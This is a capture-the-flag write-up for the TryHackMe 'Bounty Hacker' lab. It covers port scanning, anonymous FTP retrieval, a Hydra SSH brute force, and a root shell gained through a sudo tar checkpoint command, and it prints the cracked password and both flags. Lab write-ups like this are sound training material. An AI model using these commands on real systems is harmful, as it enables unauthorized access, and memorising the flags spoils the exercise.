# Bounty Hacker

```bash
export IP=10.10.0.34
```

## Scans

### Nmap

Initial nmap scan:
```bash
nmap -sC -sV -oN scans/nmap.initial $IP
```

Open Ports Found:
```
21 -- ftp
22 -- ssh
80 -- webpage
```

### DirBuster

Directories found:
```
/images
/icons -- 404 Not Found
/icons/small -- 403 Forbidden
```

found `crew.jpg` in `/images`

![crew.jpg](imgs/crew.jpg)


## FTP

Connecting to FTP and `GET`ting files
```
ftp> open
(to) 10.10.0.34
ftp> user
(username) ftp
ftp> get
(remote-file) task.txt
(local-file) task.txt
ftp> get
(remote-file) locks.txt
(local-file) locks.txt
```

found username `lin` in `task.txt` and wordlist `locks.txt`


## Hydra 

Bruteforcing username `lin` with `locks.txt` passwordlist for SSH credentials
```
hydra -l lin -P locks.txt $IP -t 4 ssh
```

found credentials `lin:RedDr4gonSynd1cat3`


## SSH into Machine

```
ssh lin@10.10.0.34
```

**User Flag Found**: `THM{CR1M3_SyNd1C4T3}`

Privesc by:
```bash
sudo -l
```

and searching for `tar` on [gtfoBins](https://gtfobins.github.io/gtfobins/tar/)

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**Root Flag Found**: `THM{80UN7Y_h4cK3r}`

---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
